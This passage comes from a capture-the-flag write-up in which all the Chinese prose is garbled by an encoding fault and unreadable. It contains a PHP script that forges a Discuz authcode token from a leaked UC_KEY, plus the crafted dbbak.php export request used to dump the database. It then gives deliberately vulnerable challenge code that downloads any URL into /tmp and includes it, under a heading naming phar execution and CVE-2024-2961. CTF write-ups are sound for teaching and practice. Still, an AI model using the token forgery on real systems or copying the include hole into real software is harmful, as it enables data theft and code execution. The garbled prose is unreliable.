</span></span><span class="line"><span class="cl">		<span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$j</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$string_length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$a</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$j</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$result</span> <span class="o">.=</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$string</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="nv">$box</span><span class="p">[(</span><span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(((</span><span class="nx">int</span><span class="p">)</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="nx">time</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">===</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">26</span><span class="p">)</span><span class="o">.</span><span class="nv">$keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">26</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$keyc</span><span class="o">.</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$result</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯è¿˜æ˜¯ä¸èƒ½æåˆ°æ•°æ®åº“ï¼Œç»§ç»­å®¡è®¡å‘ç°method=exportæ˜¯å¯ä»¥å¾—åˆ°sqlï¼Œå¯¹<code>apptype</code>çš„æ£€æŸ¥ï¼Œå¤§è‡´å¯ä»¥çŒœæµ‹å‡ºæ¥è¿™ä¸ªAPIæ˜¯ä¸ªå‡ ä¸ªåº”ç”¨çš„é€šç”¨çš„APIï¼Œè€Œæ ¸å¿ƒä½¿ç”¨çš„æ˜¯Discuz X!ï¼Œæ‰€ä»¥<code>apptype</code>åº”è¯¥æ˜¯<code>discuzx</code></p>
<p><img src="/p/2025-lilctf/image-20250906220945440.png"
	width="1370"
	height="851"
	srcset="/p/2025-lilctf/image-20250906220945440_hu_9f747ce9b7cea1a6.png 480w, /p/2025-lilctf/image-20250906220945440_hu_4b9a347843500fa3.png 1024w"
	loading="lazy"
	
		alt="image-20250906220945440"
	
	
		class="gallery-image" 
		data-flex-grow="160"
		data-flex-basis="386px"
	
></p>
<p>æ‰€ä»¥ä»£ç æ˜¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;UC_KEY&#39;</span><span class="p">,</span> <span class="s1">&#39;N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">_authcode</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$operation</span> <span class="o">=</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">,</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$expiry</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$ckey_length</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$key</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$key</span> <span class="o">?</span> <span class="nv">$key</span> <span class="o">:</span> <span class="nx">UC_KEY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$keya</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$keyb</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$keyc</span> <span class="o">=</span> <span class="nv">$ckey_length</span> <span class="o">?</span> <span class="p">(</span><span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span> <span class="o">?</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$ckey_length</span><span class="p">)</span><span class="o">:</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">microtime</span><span class="p">()),</span> <span class="o">-</span><span class="nv">$ckey_length</span><span class="p">))</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$cryptkey</span> <span class="o">=</span> <span class="nv">$keya</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$keya</span><span class="o">.</span><span class="nv">$keyc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$key_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$string</span> <span class="o">=</span> <span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span> <span class="o">?</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$ckey_length</span><span class="p">))</span> <span class="o">:</span> <span class="nx">sprintf</span><span class="p">(</span><span class="s1">&#39;%010d&#39;</span><span class="p">,</span> <span class="nv">$expiry</span> <span class="o">?</span> <span class="nv">$expiry</span> <span class="o">+</span> <span class="nx">time</span><span class="p">()</span> <span class="o">:</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$string</span><span class="o">.</span><span class="nv">$keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="nv">$string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$string_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$box</span> <span class="o">=</span> <span class="nx">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$rndkey</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$rndkey</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nv">$key_length</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$j</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$rndkey</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$j</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$string_length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$a</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$j</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$result</span> <span class="o">.=</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$string</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="nv">$box</span><span class="p">[(</span><span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(((</span><span class="nx">int</span><span class="p">)</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="nx">time</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">===</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">26</span><span class="p">)</span><span class="o">.</span><span class="nv">$keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">26</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$keyc</span><span class="o">.</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$result</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">encode_arr</span><span class="p">(</span><span class="nv">$get</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$tmp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$get</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$tmp</span> <span class="o">.=</span> <span class="s1">&#39;&amp;&#39;</span><span class="o">.</span><span class="nv">$key</span><span class="o">.</span><span class="s1">&#39;=&#39;</span><span class="o">.</span><span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">_authcode</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="s1">&#39;ENCODE&#39;</span><span class="p">,</span> <span class="nx">UC_KEY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$get</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;time&#39;</span><span class="o">=&gt;</span><span class="nx">time</span><span class="p">(),</span><span class="s1">&#39;method&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;export&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$res</span> <span class="o">=</span> <span class="nx">encode_arr</span><span class="p">(</span><span class="nv">$get</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$res</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/api/db/dbbak.php?code=7291eI3t5QNsi5s5KKVKtb03g9bQ1ZKBzya65hWRkp12kRuin9Dy5ZIWyuJLdKj2bDTMkat3aRodqVw&amp;apptype=discuzx
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025-lilctf/image-20250906223147834.png"
	width="1903"
	height="397"
	srcset="/p/2025-lilctf/image-20250906223147834_hu_9f313d35c402e72f.png 480w, /p/2025-lilctf/image-20250906223147834_hu_5821e37b61f9c2f9.png 1024w"
	loading="lazy"
	
		alt="image-20250906223147834"
	
	
		class="gallery-image" 
		data-flex-grow="479"
		data-flex-basis="1150px"
	
></p>
<p>æç¤ºflag åœ¨ <code>pre_a_flag</code> è¡¨é‡Œï¼Œæœç´¢ä¸€ä¸‹å‡º</p>
<p><img src="/p/2025-lilctf/image-20250906223441861.png"
	width="1308"
	height="126"
	srcset="/p/2025-lilctf/image-20250906223441861_hu_c2c1d7165bd84160.png 480w, /p/2025-lilctf/image-20250906223441861_hu_3f1745730a3da0d7.png 1024w"
	loading="lazy"
	
		alt="image-20250906223441861"
	
	
		class="gallery-image" 
		data-flex-grow="1038"
		data-flex-basis="2491px"
	
></p>
<p><img src="/p/2025-lilctf/image-20250906223427171.png"
	width="1508"
	height="579"
	srcset="/p/2025-lilctf/image-20250906223427171_hu_aa59631434e3fe7a.png 480w, /p/2025-lilctf/image-20250906223427171_hu_1d30d2fffe6e8fae.png 1024w"
	loading="lazy"
	
		alt="image-20250906223427171"
	
	
		class="gallery-image" 
		data-flex-grow="260"
		data-flex-basis="625px"
	
></p>
<p>éå¸¸éš¾ï¼Œå¿…é¡»è¦æœ‰éå¸¸é«˜çš„æ•æ„Ÿåº¦ã€‚</p>
<h2 id="php_jail_is_my_cry">php_jail_is_my_cry
</h2><h3 id="è€ƒç‚¹includeè§£æpharæ–‡ä»¶æ‰§è¡Œå‘½ä»¤fileåè®®ç»•è¿‡open_basedirä»»æ„æ–‡ä»¶è¯»å–file_put_contentsæ‰“cve2024-2961">è€ƒç‚¹ï¼šincludeè§£æpharæ–‡ä»¶æ‰§è¡Œå‘½ä»¤+fileåè®®ç»•è¿‡open_basedirä»»æ„æ–‡ä»¶è¯»å–+file_put_contentsæ‰“cve2024-2961
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;/tmp/&#39;</span><span class="o">.</span><span class="nv">$file_name</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;æ–‡ä»¶å·²ä¸‹è½½: &lt;a href=&#39;?down=</span><span class="si">$file_name</span><span class="s2">&#39;&gt;</span><span class="si">$file_name</span><span class="s2">&lt;/a&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;ä¸‹è½½å¤±è´¥ã€‚&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;down&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">include</span> <span class="s1">&#39;/tmp/&#39;</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;down&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// ä¸Šä¼ æ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">&#34;/tmp/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$target_dir</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
